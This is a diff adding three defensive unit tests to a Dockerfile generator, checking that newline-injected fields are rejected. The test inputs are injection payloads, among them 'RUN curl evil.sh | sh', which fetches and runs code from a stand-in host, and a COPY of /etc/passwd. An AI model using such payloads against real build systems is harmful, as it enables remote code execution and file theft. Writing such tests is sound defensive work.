@@ -168,6 +168,51 @@ describe('generateDockerfile — security', () => {
       );
     }
   });
+
+  // Independent re-check ahead of the web form validator (project.validator.js):
+  // a newline in buildCommand/startCommand/outputDirectory would inject
+  // arbitrary Dockerfile directives via RUN/CMD/COPY interpolation.
+  it('rejects a buildCommand containing a newline', () => {
+    assert.throws(
+      () =>
+        generateDockerfile({
+          runtimeType: 'REACT',
+          buildCommand: 'npm run build\nUSER root',
+          startCommand: null,
+          outputDirectory: 'dist',
+          applicationPort: null,
+        }),
+      /control character/,
+    );
+  });
+
+  it('rejects a startCommand containing a newline', () => {
+    assert.throws(
+      () =>
+        generateDockerfile({
+          runtimeType: 'NODEJS',
+          buildCommand: null,
+          startCommand: 'node server.js\nRUN curl evil.sh | sh',
+          outputDirectory: null,
+          applicationPort: 3000,
+        }),
+      /control character/,
+    );
+  });
+
+  it('rejects an outputDirectory containing a newline', () => {
+    assert.throws(
+      () =>
+        generateDockerfile({
+          runtimeType: 'REACT',
+          buildCommand: 'npm run build',
+          startCommand: null,
+          outputDirectory: 'dist\nCOPY /etc/passwd /app/passwd',
+          applicationPort: null,
+        }),
+      /control character/,
+    );
+  });
 });
 
 describe('generateDockerfile — non-root runtime user', () => {
